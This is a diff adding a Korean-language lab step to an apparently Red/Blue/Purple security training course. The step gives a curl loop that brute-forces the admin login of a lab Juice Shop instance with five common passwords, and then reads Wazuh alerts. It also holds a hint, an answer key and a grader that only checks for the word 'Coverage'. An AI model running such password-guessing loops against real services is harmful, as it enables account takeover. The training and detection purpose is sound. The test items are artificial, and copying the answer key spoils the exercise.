@@ -146,3 +146,40 @@ steps:
         success_criteria: [3 영역 + 매핑]
         acceptable_methods: ["**[관리적] PTES + CWE Top 25**"]
     target_vm: bastion
+
+  # ============================================================
+  # STEP 5 — R/B/P 종합 (Auth Failures)
+  # ============================================================
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION (R/B/P 종합) — login brute + MFA bypass + credential stuffing
+
+      Red = login brute 10 시도 / Blue = rate limit + Wazuh sshd_failed alert /
+      Purple = RBA + HIBP routine.
+
+      ## 💻 실행
+      ```bash
+      ssh 6v6-attacker 'for p in 123 password admin user test; do curl -s -o /dev/null -w "$p: %{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      ssh 6v6-siem 'tail -20 /var/ossec/logs/alerts/alerts.json 2>/dev/null | jq -r "select(.rule.id == \"5710\" or .rule.id == \"5712\") | .rule.description" | head -3 || echo "sshd brute alert 없음 (web login 의 다른 rule)"'
+      echo "Coverage: rate limit + RBA + HIBP credential check 의 routine"
+      ```
+
+      ## 💡 왜
+      login brute 의 detection + MFA 의 보완 의 routine.
+    hint: 'curl 의 5 password 시도 + alerts.json 의 rule 5710'
+    category: rbp_integration
+    points: 4
+    answer: |
+      ssh 6v6-attacker 'for p in 123 password admin user test; do curl -s -o /dev/null -w "$p: %{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      ssh 6v6-siem 'tail -20 /var/ossec/logs/alerts/alerts.json 2>/dev/null | jq -r ".rule.description" | head -3'
+      echo "Coverage: rate limit + RBA + HIBP"
+    answer_detail: Auth brute R/B/P 1 cycle
+    verify:
+      type: output_contains
+      expect: 'Coverage'
+      field: stdout
+      semantic:
+        intent: login brute R/B/P
+        success_criteria: [5 password 시도, 응답 코드, Coverage]
+        acceptable_methods: ["**[OSS] curl loop + jq alerts**"]
+    target_vm: attacker
